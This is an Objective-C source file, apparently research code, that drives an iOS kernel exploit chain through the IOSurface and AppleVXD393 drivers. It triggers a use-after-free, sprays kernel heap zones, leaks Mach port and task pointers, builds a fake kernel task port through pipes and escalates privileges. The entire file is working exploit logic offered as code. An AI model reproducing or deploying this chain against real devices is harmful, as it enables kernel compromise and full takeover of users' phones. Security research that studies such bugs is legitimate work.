//
//  main.m
//  chain3
//
//  Created by Karsten on 08.10.19.
//  Copyright Â© 2019 foxhound. All rights reserved.
//

#include <mach/mach.h>
#include <Foundation/Foundation.h>
#include "iokit.h"
#include "helper.h"
#include "iosurface.h"
#include "applevxd393.h"

void exploit()
{
    int i, read_fd, write_fd, port_number, pipe_number;
    int *pipe_fds;
    io_connect_t iosurface_client_connection, applevxd393_client_connection;
    uint32_t surface_id_userclient, surface_id_obj_control, read_val;
    uint64_t port_pointer, own_task_pointer, host_pointer;
    uint64_t port_offset, port_page, kernel_base;
    mach_port_t receive_port, target_port, other_receive_port, own_task_port;
    mach_port_t *before_ports, *after_ports, *spray_ports;
    mach_port_context_t context;

    prepare_pipes(&pipe_fds);

    if (prepare_ports(&before_ports, &after_ports, &receive_port,
		      &other_receive_port, &target_port, &spray_ports,
		      &own_task_port))
	goto out;

    if (spray_kalloc_4096_with_zeroes(&spray_ports))
    	goto out;

    if (open_connection_to_iosurface_client(&iosurface_client_connection))
    	goto out;

    if (io_surface_create(&iosurface_client_connection,
    			    &surface_id_userclient))
    	goto out;

    if (io_surface_create(&iosurface_client_connection,
			  &surface_id_obj_control))
    	goto out;

    if (open_connection_to_applevxd393(&applevxd393_client_connection))
        goto out;

    if (trigger_bug(&applevxd393_client_connection, &surface_id_userclient))
    	goto out;

    if (spray_kernel_heap_with_zeroes(&iosurface_client_connection,
				      &surface_id_obj_control, "spray"))
	goto out;

    // trigger_free always "fails" because first field of struct is NULL
    // Therefore no check for success
    trigger_free(&applevxd393_client_connection);

    if (leak_port_pointer(&receive_port, &target_port,
			  &own_task_port))
    	goto out;

    if (search_for_pointer_leak(&iosurface_client_connection,
    				  &surface_id_obj_control,
    				  &port_pointer, &own_task_pointer,
    				  &host_pointer) ||
	port_pointer == 0 ||
	own_task_pointer == 0 ||
	host_pointer == 0)
        goto out;
    else
    {
    	port_offset = get_port_offset(&port_pointer);
    	port_page = get_port_page(&port_pointer);
    }

    trigger_free(&applevxd393_client_connection);
    // Played around with this variant but seemed to be more instable
    // io_surface_remove_value_all(&iosurface_client_connection, surface_id_obj_control);

    if (spray_kalloc_64_with_port_pointers(&iosurface_client_connection,
					   &surface_id_obj_control,
					   port_pointer, own_task_pointer, host_pointer,
					   "spray2"))
        goto out;

    DEBUG_LOG2("Now Destroy The Ports");
    for (i = 0; i < N_BEFORE_PORTS; i++)
    	mach_port_destroy(mach_task_self(), before_ports[i]);
    DEBUG_LOG2("Destroyed before_ports");

    for (i = 0; i < N_AFTER_PORTS; i++)
    	mach_port_destroy(mach_task_self(), after_ports[i]);
    DEBUG_LOG2("Destroyed after_ports");

    mach_port_destroy(mach_task_self(), receive_port);
    DEBUG_LOG2("Destroyed receive_port");
    mach_port_destroy(mach_task_self(), other_receive_port);
    DEBUG_LOG2("Destroyed other_receive_port");

    force_GC2();

    if (spray_kalloc_4096(&spray_ports, &target_port, port_offset, &port_number))
    	goto out;

    DEBUG_LOG2("Enforced GC And Sprayed kalloc.4096");

    if (control_port_via_pipe(&pipe_fds, port_offset, &spray_ports[port_number],
			      &target_port, &pipe_number))
    	goto out;

    read_fd = pipe_fds[2*pipe_number];
    write_fd = pipe_fds[2*pipe_number+1];

    // if ((kernel_base = break_kaslr_via_clock_port(read_fd, write_fd, port_offset, &target_port)) == 0)
    // 	goto out;



    // if (test_pid_read(read_fd, write_fd, port_offset, kernel_base, target_port))
    // 	goto out;

    if (create_kernel_task_port(read_fd, write_fd, port_offset, own_task_pointer,
				&target_port, host_pointer))
	goto out;

    // if (test_kernel_read(target_port, kernel_base))
    // 	goto out;

    if (elevate_privileges(target_port, own_task_pointer))
    	goto out;

    clean_controlled_page(read_fd, write_fd);

out:
    DEBUG_LOG2("Finished Exploit");
}
